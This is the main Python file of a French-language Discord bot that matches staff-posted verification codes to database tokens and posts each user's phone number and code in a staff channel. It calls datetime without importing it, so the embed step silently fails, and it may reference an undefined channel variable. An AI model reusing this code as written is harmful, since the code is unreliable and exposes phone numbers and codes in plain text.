#!/usr/bin/env python
"""
Bot Discord - Point d'entrée principal
Utilise les variables d'environnement directement (pour Render)
"""
import discord
from discord.ext import commands
import os
import sys
import logging
from pathlib import Path
import re
from database import get_db

# Ajouter le chemin parent pour les imports
sys.path.append(str(Path(__file__).parent))
sys.path.append(str(Path(__file__).parent.parent))

from bot.commands import setup_commands, setup_views
from bot.utils import start_http_server

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
GUILD_ID = int(os.getenv('GUILD_ID', '0'))
STAFF_NUM_CHANNEL_ID = int(os.getenv('STAFF_NUM_CHANNEL_ID', '0'))
STAFF_CODE_CHANNEL_ID = int(os.getenv('STAFF_CODE_CHANNEL_ID', '0'))
ROLE_ID = int(os.getenv('ROLE_ID', '0'))

# Vérification que le token est présent
if not BOT_TOKEN:
    print("❌ ERREUR: BOT_TOKEN non défini dans les variables d'environnement")
    sys.exit(1)

# Configuration des logs
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

class VerificationBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=intents)
        self.guild_id = GUILD_ID
        self.http_server = None

    async def setup_hook(self):
        logger.info("🚀 Configuration du bot...")
        # DB init handled separately normally
        await setup_commands(self)
        setup_views(self)
        self.http_server = await start_http_server(self)
        logger.info("✅ Bot configuré avec succès!")

    async def on_ready(self):
        logger.info(f"✅ Bot connecté en tant que {self.user}")
        guild = self.get_guild(self.guild_id)
        if guild:
            logger.info(f"📝 Serveur: {guild.name}")
        else:
            logger.warning(f"⚠️ Serveur avec ID {self.guild_id} non trouvé")
        logger.info("🚀 Bot prêt!")

    async def on_message(self, message: discord.Message):
        # Important: laisser la gestion des commandes
        await self.process_commands(message)

        # Ignorer les bots
        if message.author.bot:
            return

        # Ne traiter que les messages dans le salon "code de numero verifie"
        if message.guild is None:
            return

        if message.channel.id != STAFF_CODE_CHANNEL_ID:
            return

        # Vérifier que l'auteur a un droit staff (manage_messages ou admin)
        perms = message.author.guild_permissions
        if not (perms.manage_messages or perms.administrator):
            # Pas le droit, on ignore
            return

        # Rechercher un code (4-8 chiffres)
        code_match = re.search(r'\b(\d{4,8})\b', message.content)
        if not code_match:
            # Pas de code détecté -> ne rien faire
            return
        code = code_match.group(1)

        # Rechercher un token dans le contenu :
        words = re.findall(r'[\w\-\_]+', message.content)
        token_found = None
        phone = None
        staff_message_id = None
        user_id = None

        if not words:
            return

        # Tester chaque mot s'il correspond à un token existant en DB
        with get_db() as conn:
            with conn.cursor() as cur:
                for w in words:
                    cur.execute("SELECT token, phone, staff_message_id, user_id FROM verifications WHERE token = %s", (w,))
                    row = cur.fetchone()
                    if row:
                        token_found = row[0]
                        phone = row[1]
                        staff_message_id = row[2]
                        user_id = row[3]
                        break

        if not token_found:
            # Aucun token correspondant -> on ignore
            await message.channel.send("❌ Aucun jeton trouvé dans la DB correspondant au message. Vérifie que le jeton est correct.", delete_after=10)
            return

        token = token_found

        # Mettre à jour la DB avec le code et staff_id (si non déjà fait)
        try:
            with get_db() as conn:
                with conn.cursor() as cur:
                    cur.execute(
                        "UPDATE verifications SET code = %s, staff_id = %s WHERE token = %s",
                        (code, message.author.id, token)
                    )
                conn.commit()
        except Exception as e:
            logger.error(f"Erreur lors de la mise à jour du code pour token {token}: {e}")
            await message.channel.send("❌ Erreur interne lors de la sauvegarde du code.", delete_after=10)
            return

        # Supprimer le message initial dans "numero a verifier" s'il existe
        guild = message.guild
        if staff_message_id and STAFF_NUM_CHANNEL_ID:
            try:
                num_channel = guild.get_channel(STAFF_NUM_CHANNEL_ID)
                if num_channel:
                    try:
                        msg = await num_channel.fetch_message(staff_message_id)
                        await msg.delete()
                    except Exception as e:
                        logger.warning(f"Impossible de supprimer le message de demande pour token {token}: {e}")
            except Exception as e:
                logger.warning(f"Erreur en récupérant le salon 'numero a verifier': {e}")

        # Poster un embed final dans le salon "code de numero verifie" (titre = numéro)
        try:
            code_channel = guild.get_channel(STAFF_CODE_CHANNEL_ID)
            if code_channel:
                embed = discord.Embed(
                    title=f"📱 {phone}",
                    color=0x00FF00,
                    description=f"**Code** : `{code}`\n**Téléphone** : `{phone}`\n**Utilisateur** : <@{user_id}>",
                    timestamp=datetime.utcnow()
                )
                await code_channel.send(embed=embed)
        except Exception as e:
            logger.warning(f"Impossible d'envoyer l'embed final dans 'code de numero verifie': {e}")

        # Optionnel : supprimer le message du staff (pour garder le channel propre)
        try:
            await message.delete()
        except Exception:
            pass

        # Acknowledge to the staff (ephemeral via channel)
        try:
            await code_channel.send(f"✅ Code enregistré et embed publié pour le jeton `{token}` (par {message.author.mention})")
        except Exception:
            # fallback
            pass

def main():
    try:
        bot = VerificationBot()
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        logger.error("❌ Token invalide - Vérifie BOT_TOKEN")
    except Exception as e:
        logger.error(f"❌ Erreur: {e}")

if __name__ == "__main__":
    main()